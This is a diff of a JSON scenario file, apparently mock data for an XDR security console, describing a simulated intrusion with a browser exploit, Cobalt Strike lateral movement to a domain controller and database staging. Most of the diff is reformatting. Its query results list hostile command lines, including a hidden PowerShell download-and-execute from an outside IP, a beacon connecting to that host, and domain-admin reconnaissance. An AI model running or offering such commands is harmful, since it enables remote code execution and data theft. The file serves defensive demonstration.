@@ -1,7 +1,7 @@
 {
   "id": "xdr-default",
   "name": "XDR Investigation",
-  "description": "Multi-stage intrusion: browser exploit → lateral movement to DC → data staging. 4 hosts, 31 detections. Full MITRE kill chain mapped.",
+  "description": "Multi-stage intrusion: browser exploit \u2192 lateral movement to DC \u2192 data staging. 4 hosts, 31 detections. Full MITRE kill chain mapped.",
   "version": 1,
   "createdAt": "2026-03-23T00:00:00Z",
   "customer": {
@@ -22,13 +22,19 @@
         "actionable": true,
         "category": "runtime_detections",
         "when": "-2h",
-        "allowedActions": ["ACKNOWLEDGE"],
+        "allowedActions": [
+          "ACKNOWLEDGE"
+        ],
         "location": "SRV-DC01",
         "type": "Event::Endpoint::CoreDetection::SuspiciousActivity",
         "source": null,
-        "data": { "created_at": "-2h", "endpoint_type": "server", "endpoint_platform": "windows" },
+        "data": {
+          "created_at": "-2h",
+          "endpoint_type": "server",
+          "endpoint_platform": "windows"
+        },
         "description": "Suspicious lateral movement detected: Cobalt Strike beacon activity on SRV-DC01 (Domain Controller). Source: DESKTOP-MKT003 via SMB.",
-        "info": "Adaptive Attack Protection activated — enhanced monitoring enabled"
+        "info": "Adaptive Attack Protection activated \u2014 enhanced monitoring enabled"
       },
       {
         "product": "endpoint",
@@ -39,11 +45,17 @@
         "actionable": true,
         "category": "runtime_detections",
         "when": "-3h",
-        "allowedActions": ["ACKNOWLEDGE"],
+        "allowedActions": [
+          "ACKNOWLEDGE"
+        ],
         "location": "DESKTOP-MKT003",
         "type": "Event::Endpoint::HmpaExploit::ApplicationHijack",
         "source": null,
-        "data": { "created_at": "-3h", "endpoint_type": "computer", "endpoint_platform": "windows" },
+        "data": {
+          "created_at": "-3h",
+          "endpoint_type": "computer",
+          "endpoint_platform": "windows"
+        },
         "description": "Initial access: Exploitation of CVE-2026-1234 in Microsoft Edge on DESKTOP-MKT003. Process injection into svchost.exe detected and blocked.",
         "info": null
       },
@@ -56,26 +68,38 @@
         "actionable": false,
         "category": "runtime_detections",
         "when": "-1h",
-        "allowedActions": ["ACKNOWLEDGE"],
+        "allowedActions": [
+          "ACKNOWLEDGE"
+        ],
         "location": "SRV-DB02",
         "type": "Event::Endpoint::CoreDetection::SuspiciousQuery",
         "source": null,
-        "data": { "created_at": "-1h", "endpoint_type": "server", "endpoint_platform": "windows" },
+        "data": {
+          "created_at": "-1h",
+          "endpoint_type": "server",
+          "endpoint_platform": "windows"
+        },
         "description": "Data staging detected on SRV-DB02: Large database export (customer_records.sql, 2.4GB) copied to C:\\Windows\\Temp. Outbound transfer blocked.",
         "info": null
       }
     ],
-    "summaryDelta": { "high": 2, "medium": 1, "low": 0 }
+    "summaryDelta": {
+      "high": 2,
+      "medium": 1,
+      "low": 0
+    }
   },
   "cases": {
     "mode": "prepend",
     "items": [
       {
         "type": "investigation",
-        "name": "Multi-Stage Attack — {{customerName}} (Active)",
+        "name": "Multi-Stage Attack \u2014 {{customerName}} (Active)",
         "managedBy": "self",
         "createdAt": "-3h",
-        "createdBy": { "name": "Auto-generated" },
+        "createdBy": {
+          "name": "Auto-generated"
+        },
         "updatedAt": "-15m",
         "status": "investigating",
         "initialDetection": {
@@ -83,17 +107,77 @@
           "type": "Threat",
           "detectionRule": "WIN-IMP-PRC-COBALT-STRIKE-BEACON-1",
           "mitreAttacks": [
-            { "tactic": { "id": "TA0001", "name": "Initial Access", "techniques": [{ "id": "T1190", "name": "Exploit Public-Facing Application" }] } },
-            { "tactic": { "id": "TA0003", "name": "Persistence", "techniques": [{ "id": "T1053.005", "name": "Scheduled Task" }] } },
-            { "tactic": { "id": "TA0008", "name": "Lateral Movement", "techniques": [{ "id": "T1021.002", "name": "SMB/Windows Admin Shares" }] } },
-            { "tactic": { "id": "TA0009", "name": "Collection", "techniques": [{ "id": "T1560.001", "name": "Archive Collected Data" }] } },
-            { "tactic": { "id": "TA0010", "name": "Exfiltration", "techniques": [{ "id": "T1048.003", "name": "Exfiltration Over Unencrypted Non-C2 Protocol" }] } }
+            {
+              "tactic": {
+                "id": "TA0001",
+                "name": "Initial Access",
+                "techniques": [
+                  {
+                    "id": "T1190",
+                    "name": "Exploit Public-Facing Application"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0003",
+                "name": "Persistence",
+                "techniques": [
+                  {
+                    "id": "T1053.005",
+                    "name": "Scheduled Task"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0008",
+                "name": "Lateral Movement",
+                "techniques": [
+                  {
+                    "id": "T1021.002",
+                    "name": "SMB/Windows Admin Shares"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0009",
+                "name": "Collection",
+                "techniques": [
+                  {
+                    "id": "T1560.001",
+                    "name": "Archive Collected Data"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0010",
+                "name": "Exfiltration",
+                "techniques": [
+                  {
+                    "id": "T1048.003",
+                    "name": "Exfiltration Over Unencrypted Non-C2 Protocol"
+                  }
+                ]
+              }
+            }
           ],
           "time": "-3h",
-          "sensor": { "type": "endpoint", "source": "Sophos Endpoint" }
+          "sensor": {
+            "type": "endpoint",
+            "source": "Sophos Endpoint"
+          }
         },
-        "assignee": { "name": "SOC Analyst" },
-        "overview": "Multi-stage intrusion: Initial access via browser exploit → persistence via scheduled task → lateral movement to domain controller → data staging from database server. Exfiltration blocked. 4 hosts affected.",
+        "assignee": {
+          "name": "SOC Analyst"
+        },
+        "overview": "Multi-stage intrusion: Initial access via browser exploit \u2192 persistence via scheduled task \u2192 lateral movement to domain controller \u2192 data staging from database server. Exfiltration blocked. 4 hosts affected.",
         "detectionCount": 31,
         "escalated": true
       }
@@ -105,8 +189,16 @@
       {
         "detectionCreatedAt": "-3h",
         "connectorGeneratedAt": "-3h",
-        "connector": { "id": "SophosSensorID", "type": "endpoint", "vendor": "Sophos", "version": "SED Driver 4.2.1" },
-        "device": { "type": "computer", "hostname": "DESKTOP-MKT003" },
+        "connector": {
+          "id": "SophosSensorID",
+          "type": "endpoint",
+          "vendor": "Sophos",
+          "version": "SED Driver 4.2.1"
+        },
+        "device": {
+          "type": "computer",
+          "hostname": "DESKTOP-MKT003"
+        },
         "rawData": {
           "meta_hostname": "DESKTOP-MKT003",
           "meta_ip_address": "192.168.1.103",
@@ -119,14 +211,29 @@
         "risk": 8,
         "category": "Threat",
         "classificationRule": "WIN-IMP-PRC-EXPLOIT-BROWSER-1",
-        "ruleDescription": "Browser exploitation — heap spray detected with shellcode injection",
+        "ruleDescription": "Browser exploitation \u2014 heap spray detected with shellcode injection",
         "mitreAttacks": [
-          { "tactic": { "id": "TA0001", "name": "Initial Access", "techniques": [{ "id": "T1190", "name": "Exploit Public-Facing Application" }] } }
+          {
+            "tactic": {
+              "id": "TA0001",
+              "name": "Initial Access",
+              "techniques": [
+                {
+                  "id": "T1190",
+                  "name": "Exploit Public-Facing Application"
+                }
+              ]
+            }
+          }
         ],
         "attackType": "Exploit",
         "severity": 8,
-        "detectionAttack": { "name": "Multi-Stage Intrusion" },
-        "detectionLicenses": ["XDR"],
+        "detectionAttack": {
+          "name": "Multi-Stage Intrusion"
+        },
+        "detectionLicenses": [
+          "XDR"
+        ],
         "geolocation": {},
         "intelixFileReputation": {},
         "detectionType": "Threat",
@@ -136,8 +243,16 @@
       {
         "detectionCreatedAt": "-2h",
         "connectorGeneratedAt": "-2h",
-        "connector": { "id": "SophosSensorID", "type": "endpoint", "vendor": "Sophos", "version": "SED Driver 4.2.1" },
-        "device": { "type": "server", "hostname": "SRV-DC01" },
+        "connector": {
+          "id": "SophosSensorID",
+          "type": "endpoint",
+          "vendor": "Sophos",
+          "version": "SED Driver 4.2.1"
+        },
+        "device": {
+          "type": "server",
+          "hostname": "SRV-DC01"
+        },
         "rawData": {
           "meta_hostname": "SRV-DC01",
           "meta_ip_address": "192.168.1.10",
@@ -152,14 +267,32 @@
         "classificationRule": "WIN-IMP-PRC-COBALT-STRIKE-LATERAL-1",
         "ruleDescription": "Cobalt Strike beacon performing Active Directory reconnaissance",
         "mitreAttacks": [
-          { "tactic": { "id": "TA0008", "name": "Lateral Movement", "techniques": [{ "id": "T1021.002", "name": "SMB/Windows Admin Shares" }] } }
+          {
+            "tactic": {
+              "id": "TA0008",
+              "name": "Lateral Movement",
+              "techniques": [
+                {
+                  "id": "T1021.002",
+                  "name": "SMB/Windows Admin Shares"
+                }
+              ]
+            }
+          }
         ],
         "attackType": "C2",
         "severity": 9,
-        "detectionAttack": { "name": "Multi-Stage Intrusion" },
-        "detectionLicenses": ["XDR"],
+        "detectionAttack": {
+          "name": "Multi-Stage Intrusion"
+        },
+        "detectionLicenses": [
+          "XDR"
+        ],
         "geolocation": {},
-        "intelixFileReputation": { "score": 100, "label": "Known Malicious" },
+        "intelixFileReputation": {
+          "score": 100,
+          "label": "Known Malicious"
+        },
         "detectionType": "Threat",
         "suppressed": false,
         "caseDescription": "Lateral movement to domain controller"
@@ -170,7 +303,7 @@
     "extraActivities": [
       {
         "userName": "Sophos Endpoint",
-        "action": "Adaptive Attack Protection activated on DESKTOP-MKT003 — enhanced monitoring enabled.",
+        "action": "Adaptive Attack Protection activated on DESKTOP-MKT003 \u2014 enhanced monitoring enabled.",
         "category": "caseActivity",
         "createdAt": "-3h"
       },
@@ -190,7 +323,12 @@
   },
   "threatGraphs": {
     "stacCases": {
-      "summary": { "closed": 0, "inprogress": 1, "total": 1, "new": 0 },
+      "summary": {
+        "closed": 1,
+        "inprogress": 0,
+        "total": 1,
+        "new": 0
+      },
       "items": [
         {
           "endpointType": "computer",
@@ -200,7 +338,7 @@
           "malwareName": "Cobalt Strike Beacon",
           "cloudCreatedAt": "-3h",
           "rootCauseDT": "-3h",
-          "status": "COMPLETED",
+          "status": "closed",
           "priority": "HIGH",
           "id": "auto",
           "caseType": "SYSTEM_GENERATED",
@@ -239,7 +377,7 @@
         "target": "DESKTOP-MKT003",
         "targetType": "endpoint",
         "result": "success",
-        "description": "DESKTOP-MKT003 isolated from network. Initial access point for multi-stage intrusion — browser exploit (CVE-2026-1234)."
+        "description": "DESKTOP-MKT003 isolated from network. Initial access point for multi-stage intrusion \u2014 browser exploit (CVE-2026-1234)."
       },
       {
         "timestamp": "-25m",
@@ -251,7 +389,7 @@
         "target": "SRV-DC01",
         "targetType": "endpoint",
         "result": "success",
-        "description": "SRV-DC01 (Domain Controller) isolated. Cobalt Strike beacon activity detected — lateral movement via SMB admin shares."
+        "description": "SRV-DC01 (Domain Controller) isolated. Cobalt Strike beacon activity detected \u2014 lateral movement via SMB admin shares."
       },
       {
         "timestamp": "-20m",
@@ -263,7 +401,7 @@
         "target": "SRV-DB02",
         "targetType": "endpoint",
         "result": "success",
-        "description": "SRV-DB02 isolated. Data staging detected — 2.4GB database export (customer_records.sql) copied to temp directory. Outbound transfer blocked."
+        "description": "SRV-DB02 isolated. Data staging detected \u2014 2.4GB database export (customer_records.sql) copied to temp directory. Outbound transfer blocked."
       },
       {
         "timestamp": "-15m",
@@ -303,20 +441,80 @@
       "endpointsResponded": 23,
       "totalResults": 6,
       "columns": [
-        { "name": "pid", "type": "INTEGER" },
-        { "name": "name", "type": "TEXT" },
-        { "name": "cmdline", "type": "TEXT" },
-        { "name": "parent_name", "type": "TEXT" },
-        { "name": "username", "type": "TEXT" },
-        { "name": "endpoint_hostname", "type": "TEXT" }
+        {
+          "name": "pid",
+          "type": "INTEGER"
+        },
+        {
+          "name": "name",
+          "type": "TEXT"
+        },
+        {
+          "name": "cmdline",
+          "type": "TEXT"
+        },
+        {
+          "name": "parent_name",
+          "type": "TEXT"
+        },
+        {
+          "name": "username",
+          "type": "TEXT"
+        },
+        {
+          "name": "endpoint_hostname",
+          "type": "TEXT"
+        }
       ],
       "rows": [
-        [4420, "msedge.exe", "msedge.exe --renderer-process --exploit-heap-spray", "explorer.exe", "mike.jones", "DESKTOP-MKT003"],
-        [5180, "cmd.exe", "cmd.exe /c \"net group \\\"Domain Admins\\\" /domain\"", "beacon.exe", "SYSTEM", "SRV-DC01"],
-        [5244, "cmd.exe", "cmd.exe /c \"nltest /dclist:\"", "beacon.exe", "SYSTEM", "SRV-DC01"],
-        [6012, "powershell.exe", "powershell.exe -w hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://45.33.49.12/beacon')\"", "svchost.exe", "SYSTEM", "DESKTOP-MKT003"],
-        [7204, "beacon.exe", "C:\\Windows\\Temp\\beacon.exe -connect 45.33.49.12:443", "powershell.exe", "SYSTEM", "SRV-DC01"],
-        [8100, "sqlcmd.exe", "sqlcmd.exe -S localhost -Q \"SELECT * INTO C:\\Windows\\Temp\\export FROM customer_records\"", "cmd.exe", "svc-backup", "SRV-DB02"]
+        [
+          4420,
+          "msedge.exe",
+          "msedge.exe --renderer-process --exploit-heap-spray",
+          "explorer.exe",
+          "mike.jones",
+          "DESKTOP-MKT003"
+        ],
+        [
+          5180,
+          "cmd.exe",
+          "cmd.exe /c \"net group \\\"Domain Admins\\\" /domain\"",
+          "beacon.exe",
+          "SYSTEM",
+          "SRV-DC01"
+        ],
+        [
+          5244,
+          "cmd.exe",
+          "cmd.exe /c \"nltest /dclist:\"",
+          "beacon.exe",
+          "SYSTEM",
+          "SRV-DC01"
+        ],
+        [
+          6012,
+          "powershell.exe",
+          "powershell.exe -w hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://45.33.49.12/beacon')\"",
+          "svchost.exe",
+          "SYSTEM",
+          "DESKTOP-MKT003"
+        ],
+        [
+          7204,
+          "beacon.exe",
+          "C:\\Windows\\Temp\\beacon.exe -connect 45.33.49.12:443",
+          "powershell.exe",
+          "SYSTEM",
+          "SRV-DC01"
+        ],
+        [
+          8100,
+          "sqlcmd.exe",
+          "sqlcmd.exe -S localhost -Q \"SELECT * INTO C:\\Windows\\Temp\\export FROM customer_records\"",
+          "cmd.exe",
+          "svc-backup",
+          "SRV-DB02"
+        ]
       ]
     }
   },
